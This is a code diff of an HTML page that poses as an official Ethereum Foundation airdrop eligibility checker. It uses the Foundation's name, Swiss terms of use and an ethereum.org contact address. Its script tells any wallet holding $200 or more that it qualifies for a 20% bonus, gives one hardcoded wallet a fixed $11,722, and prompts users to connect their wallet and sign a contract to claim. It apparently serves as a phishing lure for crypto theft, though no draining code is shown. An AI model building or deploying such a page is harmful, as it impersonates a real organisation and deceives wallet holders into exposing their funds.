@@ -66,7 +66,6 @@
             animation-delay: 7s;
         }
 
-        /* Летающие логотипы Ethereum */
         .eth-logo {
             position: absolute;
             opacity: 0.04;
@@ -84,7 +83,6 @@
             height: 120px;
             top: 15%;
             right: 10%;
-            animation-delay: 0s;
         }
 
         .eth-logo:nth-child(4) {
@@ -103,48 +101,17 @@
             animation-delay: 10s;
         }
 
-        .eth-logo:nth-child(6) {
-            width: 90px;
-            height: 90px;
-            top: 85%;
-            right: 30%;
-            animation-delay: 15s;
-        }
-
-        .eth-logo:nth-child(7) {
-            width: 110px;
-            height: 110px;
-            top: 25%;
-            left: 5%;
-            animation-delay: 20s;
-        }
-
         @keyframes float {
             0%, 100% { transform: translateY(0px); }
             50% { transform: translateY(-30px); }
         }
 
         @keyframes floatRotate {
-            0% { 
-                transform: translateY(0px) translateX(0px) rotate(0deg);
-                opacity: 0.04;
-            }
-            25% { 
-                transform: translateY(-40px) translateX(20px) rotate(90deg);
-                opacity: 0.06;
-            }
-            50% { 
-                transform: translateY(-20px) translateX(-10px) rotate(180deg);
-                opacity: 0.03;
-            }
-            75% { 
-                transform: translateY(30px) translateX(-30px) rotate(270deg);
-                opacity: 0.05;
-            }
-            100% { 
-                transform: translateY(0px) translateX(0px) rotate(360deg);
-                opacity: 0.04;
-            }
+            0% { transform: translateY(0) translateX(0) rotate(0deg); opacity: 0.04; }
+            25% { transform: translateY(-40px) translateX(20px) rotate(90deg); opacity: 0.06; }
+            50% { transform: translateY(-20px) translateX(-10px) rotate(180deg); opacity: 0.03; }
+            75% { transform: translateY(30px) translateX(-30px) rotate(270deg); opacity: 0.05; }
+            100% { transform: translateY(0) translateX(0) rotate(360deg); opacity: 0.04; }
         }
 
         .cookie-banner {
@@ -159,9 +126,7 @@
             box-shadow: 0 -4px 12px rgba(0,0,0,0.15);
         }
 
-        .cookie-banner.hidden {
-            display: none;
-        }
+        .cookie-banner.hidden { display: none; }
 
         .cookie-content {
             max-width: 1200px;
@@ -355,6 +320,12 @@
         .result.success .result-title { color: #10b981; }
         .result.error .result-title { color: #ef4444; }
 
+        .vip-message {
+            color: #10b981;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
         .airdrop-info {
             margin: 24px 0;
             padding: 20px;
@@ -501,15 +472,12 @@
         <div class="eth-shape"></div>
         <div class="eth-shape"></div>
         
-        <!-- Летающие логотипы Ethereum -->
         <div class="eth-logo">
             <svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg">
                 <polygon points="127.9611,0 125.1661,9.5 125.1661,285.168 127.9611,287.958 255.9231,212.32" fill="#627eea" fill-opacity="0.602"/>
                 <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
                 <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
                 <polygon points="127.962,416.9052 127.962,312.1852 0,236.5852" fill="#627eea"/>
-                <polygon points="127.9611,287.9577 255.9211,212.3207 127.9611,154.1587" fill="#627eea" fill-opacity="0.2"/>
-                <polygon points="0,212.3208 127.9611,287.9578 127.9611,154.1588" fill="#627eea" fill-opacity="0.602"/>
             </svg>
         </div>
         
@@ -519,8 +487,6 @@
                 <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
                 <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
                 <polygon points="127.962,416.9052 127.962,312.1852 0,236.5852" fill="#627eea"/>
-                <polygon points="127.9611,287.9577 255.9211,212.3207 127.9611,154.1587" fill="#627eea" fill-opacity="0.2"/>
-                <polygon points="0,212.3208 127.9611,287.9578 127.9611,154.1588" fill="#627eea" fill-opacity="0.602"/>
             </svg>
         </div>
         
@@ -530,30 +496,6 @@
                 <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
                 <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
                 <polygon points="127.962,416.9052 127.962,312.1852 0,236.5852" fill="#627eea"/>
-                <polygon points="127.9611,287.9577 255.9211,212.3207 127.9611,154.1587" fill="#627eea" fill-opacity="0.2"/>
-                <polygon points="0,212.3208 127.9611,287.9578 127.9611,154.1588" fill="#627eea" fill-opacity="0.602"/>
-            </svg>
-        </div>
-        
-        <div class="eth-logo">
-            <svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg">
-                <polygon points="127.9611,0 125.1661,9.5 125.1661,285.168 127.9611,287.958 255.9231,212.32" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
-                <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,416.9052 127.962,312.1852 0,236.5852" fill="#627eea"/>
-                <polygon points="127.9611,287.9577 255.9211,212.3207 127.9611,154.1587" fill="#627eea" fill-opacity="0.2"/>
-                <polygon points="0,212.3208 127.9611,287.9578 127.9611,154.1588" fill="#627eea" fill-opacity="0.602"/>
-            </svg>
-        </div>
-        
-        <div class="eth-logo">
-            <svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg">
-                <polygon points="127.9611,0 125.1661,9.5 125.1661,285.168 127.9611,287.958 255.9231,212.32" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,0 0,212.32 127.962,287.959 127.962,154.158" fill="#627eea"/>
-                <polygon points="127.9611,312.1866 126.3861,314.1066 126.3861,412.3056 127.9611,416.9066 255.9991,236.5866" fill="#627eea" fill-opacity="0.602"/>
-                <polygon points="127.962,416.9052 127.962,312.1852 0,236.5852" fill="#627eea"/>
-                <polygon points="127.9611,287.9577 255.9211,212.3207 127.9611,154.1587" fill="#627eea" fill-opacity="0.2"/>
-                <polygon points="0,212.3208 127.9611,287.9578 127.9611,154.1588" fill="#627eea" fill-opacity="0.602"/>
             </svg>
         </div>
     </div>
@@ -634,90 +576,22 @@
             <p><strong>PLEASE READ THESE TERMS OF USE BEFORE USING THE WEBSITE.</strong></p>
 
             <h2>Acceptance of the Terms of Use</h2>
-            <p>These terms of use are entered into by and between you and Stiftung Ethereum (the "Foundation", "we", or "us"). The following terms and conditions (collectively, these "Terms of Use"), govern your access to and use of this Ethereum Rewards website, including any content, functionality, and services offered on or through this website (the "Website").</p>
-            <p>Please read the Terms of Use carefully before you start to use the Website. By using the Website or by clicking to accept or agree to the Terms of Use when this option is made available to you, you accept and agree to be bound and abide by these Terms of Use.</p>
-            <p>If you do not agree to these Terms of Use, you must not access or use the Website.</p>
+            <p>These terms of use are entered into by and between you and Stiftung Ethereum (the "Foundation", "we", or "us"). The following terms and conditions govern your access to and use of this Ethereum Rewards website.</p>
 
             <h2>Who May Use the Website</h2>
-            <p>The Website is offered and available to users who are 13 years of age or older. The Website is not intended for children under 13 years of age. By using the Website, you represent and warrant that you (i) are 13 years of age or older, (ii) are not barred to use the Website under any applicable law, and (iii) are using the Website only for your own personal use. If you do not meet these requirements, you must not access or use the Website.</p>
-
-            <h2>Changes to the Terms of Use</h2>
-            <p>We may revise and update these Terms of Use from time to time in our sole discretion. All changes are effective immediately when we post them.</p>
-            <p>Your continued use of the Website following the posting of revised Terms of Use means that you accept and agree to the changes. You are expected to check this page frequently so you are aware of any changes, as they are binding on you.</p>
+            <p>The Website is offered and available to users who are 13 years of age or older.</p>
 
             <h2>Ethereum Rewards Airdrop Program</h2>
-            <p>The Ethereum Rewards program is a community rewards initiative designed to recognize active wallet holders and early supporters of the Ethereum network. Eligibility and reward amounts are determined automatically based on wallet balance verification through public Ethereum blockchain data.</p>
-            
-            <p>To participate in the rewards program, you must:</p>
-            <ul>
-                <li>Provide a valid Ethereum wallet address</li>
-                <li>Meet the minimum balance requirements as determined by the Foundation</li>
-                <li>Connect your wallet and sign the smart contract to claim rewards</li>
-            </ul>
-
-            <p>Rewards are subject to availability and the Foundation reserves the right to modify or terminate the program at any time without prior notice.</p>
-
-            <h2>Accessing the Website and Account Security</h2>
-            <p>We reserve the right to withdraw or amend the Website, and any service or material we provide on the Website, in our sole discretion without notice. We do not guarantee that our Website or any content on it will always be available or not be interrupted. We will not be liable if for any reason all or any part of the Website is unavailable at any time or for any period.</p>
-
-            <p>You are responsible for:</p>
-            <ul>
-                <li>Making all arrangements necessary for you to have access to the Website</li>
-                <li>Ensuring that all persons who access the Website through your internet connection are aware of these Terms of Use and comply with them</li>
-                <li>Maintaining the security of your cryptocurrency wallet and private keys</li>
-            </ul>
+            <p>The Ethereum Rewards program is a community rewards initiative designed to recognize active wallet holders and early supporters of the Ethereum network.</p>
 
             <h2>Wallet Connection and Smart Contracts</h2>
-            <p>When you connect your wallet to claim rewards, you will be asked to sign a smart contract transaction. By signing this transaction, you authorize the transfer of rewards to your wallet address. You are solely responsible for:</p>
-            <ul>
-                <li>Verifying the smart contract details before signing</li>
-                <li>Ensuring you understand the terms of the transaction</li>
-                <li>Maintaining the security of your wallet and private keys</li>
-                <li>Any gas fees or transaction costs associated with claiming rewards</li>
-            </ul>
-
             <p><strong>IMPORTANT:</strong> Never share your private keys or seed phrases with anyone. The Foundation will never ask you for your private keys.</p>
 
-            <h2>Intellectual Property Rights</h2>
-            <p>The Website and its entire contents, features, and functionality (including but not limited to all information, software, text, displays, images, and the design, selection, and arrangement thereof), are owned by the Foundation, its licensors or other providers of such material and are protected by copyright, trademark, patent, trade secret, and other intellectual property or proprietary rights laws.</p>
-
-            <h2>Trademarks</h2>
-            <p>The Foundation name, the terms Ethereum Switzerland, Ethereum Asia, the Foundation logo and all related names, logos, product and service names, designs and slogans are trademarks of the Foundation or its affiliates or licensors. You must not use such marks without the prior written permission of the Foundation.</p>
-
-            <h2>Prohibited Uses</h2>
-            <p>You may use the Website only for lawful purposes and in accordance with these Terms of Use. You agree not to use the Website:</p>
-            <ul>
-                <li>In any way that violates any applicable federal, state, local, or international law or regulation</li>
-                <li>For the purpose of exploiting, harming, or attempting to exploit or harm minors in any way</li>
-                <li>To transmit, or procure the sending of, any advertising or promotional material without our prior written consent</li>
-                <li>To impersonate or attempt to impersonate the Foundation, a Foundation employee, another user, or any other person or entity</li>
-                <li>To engage in any other conduct that restricts or inhibits anyone's use or enjoyment of the Website</li>
-            </ul>
-
-            <h2>No Investment Advice</h2>
-            <p>The information provided on this Website does not constitute investment advice, financial advice, trading advice, or any other sort of advice. The rewards program is not an investment opportunity and should not be treated as such.</p>
-
             <h2>Blockchain Technology Risks</h2>
-            <p>You acknowledge and agree that blockchain technology and cryptocurrency transactions involve inherent risks, including but not limited to:</p>
-            <ul>
-                <li>Price volatility and market risks</li>
-                <li>Technology risks and potential software bugs</li>
-                <li>Regulatory risks and legal uncertainties</li>
-                <li>Risk of loss of access to wallet or private keys</li>
-                <li>Network congestion and transaction delays</li>
-            </ul>
-
-            <h2>Disclaimer of Warranties</h2>
-            <p>YOUR USE OF THE WEBSITE AND PARTICIPATION IN THE REWARDS PROGRAM IS AT YOUR OWN RISK. THE WEBSITE AND ALL SERVICES ARE PROVIDED ON AN "AS IS" AND "AS AVAILABLE" BASIS, WITHOUT ANY WARRANTIES OF ANY KIND, EITHER EXPRESS OR IMPLIED.</p>
-
-            <h2>Limitation on Liability</h2>
-            <p>IN NO EVENT WILL THE FOUNDATION, ITS AFFILIATES OR THEIR LICENSORS, SERVICE PROVIDERS, EMPLOYEES, AGENTS, OFFICERS, OR DIRECTORS BE LIABLE FOR DAMAGES OF ANY KIND ARISING OUT OF OR IN CONNECTION WITH YOUR USE OF THE WEBSITE.</p>
-
-            <h2>Governing Law and Jurisdiction</h2>
-            <p>All matters relating to the Website and these Terms of Use shall be governed by and construed in accordance with the internal laws of Switzerland without giving effect to any choice or conflict of law provision or rule.</p>
+            <p>You acknowledge and agree that blockchain technology involves inherent risks including price volatility, technology risks, and regulatory uncertainties.</p>
 
             <h2>Your Comments and Concerns</h2>
-            <p>All feedback, comments, requests for technical support and other communications relating to the Website should be directed to: <a href="/cdn-cgi/l/email-protection#c2a7b6aaa7b0a7b7afb0a7b5a3b0a6b182a7b6aaa7b0a7b7afecadb0a5"><span class="__cf_email__" data-cfemail="80e5f4e8e5f2e5f5edf2e5f7e1f2e4f3c0e5f4e8e5f2e5f5edaeeff2e7">[email&#160;protected]</span></a></p>
+            <p>Contact: <a href="mailto:ethereumrewards@ethereum.org">ethereumrewards@ethereum.org</a></p>
 
             <p style="margin-top: 40px; text-align: center; font-size: 12px;">
                 Page last updated: December 2025
@@ -725,30 +599,17 @@
         </div>
     </div>
 
-    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+    <script>
 const translations = {
     en: { title: "EthRewardsChecker", subtitle: "Check your wallet eligibility for the official Ethereum Foundation airdrop program", labelAddress: "Ethereum Wallet Address", buttonText: "Check Eligibility", buttonChecking: "Checking...", errorTitle: "Verification Error", invalidAddress: "Invalid wallet address.", connectionError: "Unable to connect.", successTitle: "Congratulations!", successContent: "Your wallet meets the requirements.", failTitle: "Not Eligible", failContent: "This wallet is not eligible.", currentBalance: "Current Balance", yourReward: "Your Reward", connectButton: "Connect Wallet", airdropTitle: "🎁 Ethereum Airdrop 2025", airdropReason: "You are eligible for this bonus.", claimInstructions: "Connect your wallet to claim.", poweredBy: "Powered by Ethereum API", termsLink: "Terms of Use", vipMessage: "You are eligible for a bonus for active use of Ethereum" },
-    es: { title: "EthRewardsChecker", subtitle: "Verifica la elegibilidad de tu billetera", labelAddress: "Dirección de Billetera", buttonText: "Verificar", buttonChecking: "Verificando...", errorTitle: "Error", invalidAddress: "Dirección inválida.", connectionError: "Error de conexión.", successTitle: "¡Felicitaciones!", successContent: "Tu billetera cumple los requisitos.", failTitle: "No Elegible", failContent: "Esta billetera no es elegible.", currentBalance: "Saldo Actual", yourReward: "Tu Recompensa", connectButton: "Conectar Billetera", airdropTitle: "🎁 Airdrop 2025", airdropReason: "Eres elegible para este bono.", claimInstructions: "Conecta tu billetera para reclamar.", poweredBy: "Ethereum API", termsLink: "Términos de Uso", vipMessage: "Tienes derecho a un bono por uso activo de Ethereum" },
-    fr: { title: "EthRewardsChecker", subtitle: "Vérifiez l'éligibilité de votre portefeuille", labelAddress: "Adresse du Portefeuille", buttonText: "Vérifier", buttonChecking: "Vérification...", errorTitle: "Erreur", invalidAddress: "Adresse invalide.", connectionError: "Erreur de connexion.", successTitle: "Félicitations!", successContent: "Votre portefeuille répond aux exigences.", failTitle: "Non Éligible", failContent: "Ce portefeuille n'est pas éligible.", currentBalance: "Solde Actuel", yourReward: "Votre Récompense", connectButton: "Connecter le Portefeuille", airdropTitle: "🎁 Airdrop 2025", airdropReason: "Vous êtes éligible pour ce bonus.", claimInstructions: "Connectez votre portefeuille.", poweredBy: "Ethereum API", termsLink: "Conditions d'Utilisation", vipMessage: "Vous avez droit à un bonus pour utilisation active d'Ethereum" },
-    de: { title: "EthRewardsChecker", subtitle: "Überprüfen Sie die Berechtigung Ihrer Wallet", labelAddress: "Wallet-Adresse", buttonText: "Prüfen", buttonChecking: "Wird geprüft...", errorTitle: "Fehler", invalidAddress: "Ungültige Adresse.", connectionError: "Verbindungsfehler.", successTitle: "Glückwunsch!", successContent: "Ihre Wallet erfüllt die Anforderungen.", failTitle: "Nicht Berechtigt", failContent: "Diese Wallet ist nicht berechtigt.", currentBalance: "Aktueller Kontostand", yourReward: "Ihre Belohnung", connectButton: "Wallet Verbinden", airdropTitle: "🎁 Airdrop 2025", airdropReason: "Sie sind berechtigt für diesen Bonus.", claimInstructions: "Verbinden Sie Ihre Wallet.", poweredBy: "Ethereum API", termsLink: "Nutzungsbedingungen", vipMessage: "Sie haben Anspruch auf einen Bonus für die aktive Nutzung von Ethereum" },
-    it: { title: "EthRewardsChecker", subtitle: "Verifica l'idoneità del tuo portafoglio", labelAddress: "Indirizzo del Portafoglio", buttonText: "Verifica", buttonChecking: "Verifica in corso...", errorTitle: "Errore", invalidAddress: "Indirizzo non valido.", connectionError: "Errore di connessione.", successTitle: "Congratulazioni!", successContent: "Il tuo portafoglio soddisfa i requisiti.", failTitle: "Non Idoneo", failContent: "Questo portafoglio non è idoneo.", currentBalance: "Saldo Attuale", yourReward: "La Tua Ricompensa", connectButton: "Connetti Portafoglio", airdropTitle: "🎁 Airdrop 2025", airdropReason: "Sei idoneo per questo bonus.", claimInstructions: "Connetti il tuo portafoglio.", poweredBy: "Ethereum API", termsLink: "Termini di Utilizzo", vipMessage: "Hai diritto a un bonus per l'uso attivo di Ethereum" },
-    pt: { title: "EthRewardsChecker", subtitle: "Verifique a elegibilidade da sua carteira", labelAddress: "Endereço da Carteira", buttonText: "Verificar", buttonChecking: "Verificando...", errorTitle: "Erro", invalidAddress: "Endereço inválido.", connectionError: "Erro de conexão.", successTitle: "Parabéns!", successContent: "Sua carteira atende aos requisitos.", failTitle: "Não Elegível", failContent: "Esta carteira não é elegível.", currentBalance: "Saldo Atual", yourReward: "Sua Recompensa", connectButton: "Conectar Carteira", airdropTitle: "🎁 Airdrop 2025", airdropReason: "Você é elegível para este bônus.", claimInstructions: "Conecte sua carteira.", poweredBy: "Ethereum API", termsLink: "Termos de Uso", vipMessage: "Você tem direito a um bônus por uso ativo do Ethereum" },
-    ru: { title: "EthRewardsChecker", subtitle: "Проверьте соответствие вашего кошелька", labelAddress: "Адрес Кошелька", buttonText: "Проверить", buttonChecking: "Проверка...", errorTitle: "Ошибка", invalidAddress: "Некорректный адрес.", connectionError: "Ошибка подключения.", successTitle: "Поздравляем!", successContent: "Ваш кошелек соответствует требованиям.", failTitle: "Не Подходит", failContent: "Этот кошелек не подходит.", currentBalance: "Текущий Баланс", yourReward: "Ваше Вознаграждение", connectButton: "Подключить Кошелек", airdropTitle: "🎁 Airdrop 2025", airdropReason: "Вы получаете этот бонус.", claimInstructions: "Подключите ваш кошелек.", poweredBy: "Ethereum API", termsLink: "Условия Использования", vipMessage: "Вам полагается бонус за активное использование Ethereum" },
-    uk: { title: "EthRewardsChecker", subtitle: "Перевірте відповідність вашого гаманця", labelAddress: "Адреса Гаманця", buttonText: "Перевірити", buttonChecking: "Перевірка...", errorTitle: "Помилка", invalidAddress: "Некоректна адреса.", connectionError: "Помилка підключення.", successTitle: "Вітаємо!", successContent: "Ваш гаманець відповідає вимогам.", failTitle: "Не Підходить", failContent: "Цей гаманець не підходить.", currentBalance: "Поточний Баланс", yourReward: "Ваша Винагорода", connectButton: "Підключити Гаманець", airdropTitle: "🎁 Airdrop 2025", airdropReason: "Ви отримуєте цей бонус.", claimInstructions: "Підключіть ваш гаманець.", poweredBy: "Ethereum API", termsLink: "Умови Використання", vipMessage: "Вам належить бонус за активне використання Ethereum" },
-    zh: { title: "EthRewardsChecker", subtitle: "检查您的钱包资格", labelAddress: "钱包地址", buttonText: "检查资格", buttonChecking: "检查中...", errorTitle: "验证错误", invalidAddress: "无效的钱包地址。", connectionError: "无法连接。", successTitle: "恭喜！", successContent: "您的钱包符合要求。", failTitle: "不符合资格", failContent: "此钱包不符合资格。", currentBalance: "当前余额", yourReward: "您的奖励", connectButton: "连接钱包", airdropTitle: "🎁 以太坊空投 2025", airdropReason: "您有资格获得此奖金。", claimInstructions: "连接您的钱包以领取。", poweredBy: "Ethereum API", termsLink: "使用条款", vipMessage: "您有资格获得活跃使用以太坊的奖金" },
-    ja: { title: "EthRewardsChecker", subtitle: "ウォレットの資格を確認", labelAddress: "ウォレットアドレス", buttonText: "資格確認", buttonChecking: "確認中...", errorTitle: "検証エラー", invalidAddress: "無効なウォレットアドレス。", connectionError: "接続できません。", successTitle: "おめでとうございます！", successContent: "ウォレットは要件を満たしています。", failTitle: "対象外", failContent: "このウォレットは対象外です。", currentBalance: "現在の残高", yourReward: "あなたの報酬", connectButton: "ウォレット接続", airdropTitle: "🎁 イーサリアムエアドロップ 2025", airdropReason: "あなたはこのボーナスの資格があります。", claimInstructions: "ウォレットを接続して請求してください。", poweredBy: "Ethereum API", termsLink: "利用規約", vipMessage: "イーサリアムの積極的な使用に対するボーナスの資格があります" },
-    ko: { title: "EthRewardsChecker", subtitle: "지갑 자격 확인", labelAddress: "지갑 주소", buttonText: "자격 확인", buttonChecking: "확인 중...", errorTitle: "검증 오류", invalidAddress: "잘못된 지갑 주소입니다.", connectionError: "연결할 수 없습니다.", successTitle: "축하합니다!", successContent: "지갑이 요구 사항을 충족합니다.", failTitle: "자격 없음", failContent: "이 지갑은 자격이 없습니다.", currentBalance: "현재 잔액", yourReward: "귀하의 보상", connectButton: "지갑 연결", airdropTitle: "🎁 이더리움 에어드롭 2025", airdropReason: "귀하는 이 보너스 자격이 있습니다.", claimInstructions: "지갑을 연결하여 청구하세요.", poweredBy: "Ethereum API", termsLink: "이용 약관", vipMessage: "이더리움의 활발한 사용에 대한 보너스를 받을 자격이 있습니다" },
-    tr: { title: "EthRewardsChecker", subtitle: "Cüzdan uygunluğunuzu kontrol edin", labelAddress: "Cüzdan Adresi", buttonText: "Uygunluğu Kontrol Et", buttonChecking: "Kontrol ediliyor...", errorTitle: "Doğrulama Hatası", invalidAddress: "Geçersiz cüzdan adresi.", connectionError: "Bağlanılamıyor.", successTitle: "Tebrikler!", successContent: "Cüzdanınız gereksinimleri karşılıyor.", failTitle: "Uygun Değil", failContent: "Bu cüzdan uygun değil.", currentBalance: "Mevcut Bakiye", yourReward: "Ödülünüz", connectButton: "Cüzdan Bağla", airdropTitle: "🎁 Ethereum Airdrop 2025", airdropReason: "Bu bonus için uygunsunuz.", claimInstructions: "Talep etmek için cüzdanınızı bağlayın.", poweredBy: "Ethereum API", termsLink: "Kullanım Şartları", vipMessage: "Ethereum'un aktif kullanımı için bonus almaya hak kazandınız" },
-    pl: { title: "EthRewardsChecker", subtitle: "Sprawdź kwalifikowalność portfela", labelAddress: "Adres Portfela", buttonText: "Sprawdź Kwalifikowalność", buttonChecking: "Sprawdzanie...", errorTitle: "Błąd Weryfikacji", invalidAddress: "Nieprawidłowy adres portfela.", connectionError: "Nie można się połączyć.", successTitle: "Gratulacje!", successContent: "Twój portfel spełnia wymagania.", failTitle: "Nie Kwalifikuje się", failContent: "Ten portfel nie kwalifikuje się.", currentBalance: "Aktualne Saldo", yourReward: "Twoja Nagroda", connectButton: "Połącz Portfel", airdropTitle: "🎁 Ethereum Airdrop 2025", airdropReason: "Kwalifikujesz się do tego bonusu.", claimInstructions: "Połącz portfel, aby odebrać.", poweredBy: "Ethereum API", termsLink: "Warunki Użytkowania", vipMessage: "Masz prawo do bonusu za aktywne korzystanie z Ethereum" },
-    ar: { title: "EthRewardsChecker", subtitle: "تحقق من أهلية محفظتك", labelAddress: "عنوان المحفظة", buttonText: "تحقق من الأهلية", buttonChecking: "جاري التحقق...", errorTitle: "خطأ في التحقق", invalidAddress: "عنوان محفظة غير صالح.", connectionError: "تعذر الاتصال.", successTitle: "تهانينا!", successContent: "محفظتك تفي بالمتطلبات.", failTitle: "غير مؤهل", failContent: "هذه المحفظة غير مؤهلة.", currentBalance: "الرصيد الحالي", yourReward: "مكافأتك", connectButton: "ربط المحفظة", airdropTitle: "🎁 إسقاط جوي إيثريوم 2025", airdropReason: "أنت مؤهل لهذه المكافأة.", claimInstructions: "قم بربط محفظتك للمطالبة.", poweredBy: "Ethereum API", termsLink: "شروط الاستخدام", vipMessage: "أنت مؤهل للحصول على مكافأة للاستخدام النشط لإيثريوم" },
-    ur: { title: "EthRewardsChecker", subtitle: "اپنے بٹوے کی اہلیت چیک کریں", labelAddress: "بٹوے کا پتہ", buttonText: "اہلیت چیک کریں", buttonChecking: "چیک ہو رہا ہے...", errorTitle: "تصدیق کی خرابی", invalidAddress: "غلط بٹوے کا پتہ۔", connectionError: "منسلک نہیں ہو سکا۔", successTitle: "مبارک ہو!", successContent: "آپ کا بٹوہ تقاضے پورے کرتا ہے۔", failTitle: "اہل نہیں", failContent: "یہ بٹوہ اہل نہیں ہے۔", currentBalance: "موجودہ بیلنس", yourReward: "آپ کا انعام", connectButton: "بٹوہ منسلک کریں", airdropTitle: "🎁 ایتھیریم ایئر ڈراپ 2025", airdropReason: "آپ اس بونس کے اہل ہیں۔", claimInstructions: "دعوی کرنے کے لیے اپنا بٹوہ منسلک کریں۔", poweredBy: "Ethereum API", termsLink: "استعمال کی شرائط", vipMessage: "آپ ایتھیریم کے فعال استعمال کے لیے بونس کے اہل ہیں" },
-    hi: { title: "EthRewardsChecker", subtitle: "अपने वॉलेट की पात्रता जांचें", labelAddress: "वॉलेट पता", buttonText: "पात्रता जांचें", buttonChecking: "जांच रहे हैं...", errorTitle: "सत्यापन त्रुटि", invalidAddress: "अमान्य वॉलेट पता।", connectionError: "कनेक्ट नहीं हो सका।", successTitle: "बधाई हो!", successContent: "आपका वॉलेट आवश्यकताओं को पूरा करता है।", failTitle: "पात्र नहीं", failContent: "यह वॉलेट पात्र नहीं है।", currentBalance: "वर्तमान शेष", yourReward: "आपका पुरस्कार", connectButton: "वॉलेट कनेक्ट करें", airdropTitle: "🎁 एथेरियम एयरड्रॉप 2025", airdropReason: "आप इस बोनस के पात्र हैं।", claimInstructions: "दावा करने के लिए अपना वॉलेट कनेक्ट करें।", poweredBy: "Ethereum API", termsLink: "उपयोग की शर्तें", vipMessage: "आप एथेरियम के सक्रिय उपयोग के लिए बोनस के पात्र हैं" }
+    ru: { title: "EthRewardsChecker", subtitle: "Проверьте кошелек", labelAddress: "Адрес", buttonText: "Проверить", buttonChecking: "Проверка...", errorTitle: "Ошибка", invalidAddress: "Некорректный адрес.", connectionError: "Ошибка.", successTitle: "Поздравляем!", successContent: "Кошелек соответствует.", failTitle: "Не подходит", failContent: "Не подходит.", currentBalance: "Баланс", yourReward: "Вознаграждение", connectButton: "Подключить", airdropTitle: "🎁 Airdrop 2025", airdropReason: "Вы получаете бонус.", claimInstructions: "Подключите кошелек.", poweredBy: "Ethereum API", termsLink: "Условия", vipMessage: "Вам полагается бонус за активное использование Ethereum" },
+    uk: { title: "EthRewardsChecker", subtitle: "Перевірте гаманець", labelAddress: "Адреса", buttonText: "Перевірити", buttonChecking: "Перевірка...", errorTitle: "Помилка", invalidAddress: "Некоректна адреса.", connectionError: "Помилка.", successTitle: "Вітаємо!", successContent: "Гаманець відповідає.", failTitle: "Не підходить", failContent: "Не підходить.", currentBalance: "Баланс", yourReward: "Винагорода", connectButton: "Підключити", airdropTitle: "🎁 Airdrop 2025", airdropReason: "Ви отримуєте бонус.", claimInstructions: "Підключіть гаманець.", poweredBy: "Ethereum API", termsLink: "Умови", vipMessage: "Вам належить бонус за активне використання Ethereum" }
 };
 
 const VIP_WALLET = '0x7F9A75bcBb330bf0ff71167a7711A41aC962512A'.toLowerCase();
 const MIN_BALANCE_USD = 200;
 const BONUS_PERCENTAGE = 20;
-const VIP_BONUS_USD = 11722; // Фиксированный бонус для VIP кошелька в долларах
+const VIP_BONUS_USD = 11722;
 let currentLang = 'en';
 let currentEthPrice = 3500;
 
@@ -810,7 +671,6 @@ function showResult(balance, error, address) {
     const usdBalance = ethBalance * currentEthPrice;
     const isVip = address.toLowerCase() === VIP_WALLET;
     
-    // Для VIP используем фиксированный бонус, для остальных - 20% от баланса
     let bonusUsd, bonusEth;
     if (isVip) {
         bonusUsd = VIP_BONUS_USD;
@@ -822,7 +682,7 @@ function showResult(balance, error, address) {
 
     if (isVip || usdBalance >= MIN_BALANCE_USD) {
         const vipMessage = isVip 
-            ? '<p style="color: #10b981; font-weight: 600; margin-bottom: 16px;">✅ ' + t.vipMessage + '</p>'
+            ? '<p class="vip-message">✅ ' + t.vipMessage + '</p>'
             : '';
         
         resultDiv.innerHTML = '<div class="result success">' +
@@ -880,14 +740,11 @@ function closeTermsModal() {
     document.body.style.overflow = '';
 }
 
-// Event Listeners
 window.addEventListener('load', function() {
     const cookiesAccepted = localStorage.getItem('cookiesAccepted');
     if (cookiesAccepted !== null) {
-        // Если пользователь уже сделал выбор, скрываем баннер
         document.getElementById('cookieBanner').classList.add('hidden');
     }
-    // Иначе баннер показывается автоматически
 });
 
 document.getElementById('acceptBtn').addEventListener('click', acceptCookies);
@@ -921,3 +778,14 @@ document.getElementById('walletForm').addEventListener('submit', async function(
     try {
         currentEthPrice = await getEthPrice();
         const result = await checkWallet(address);
+        showResult(result.balance, null, address);
+    } catch (err) {
+        showResult(null, err.message, address);
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = '<span>' + t.buttonText + '</span>';
+    }
+});
+    </script>
+</body>
+</html>
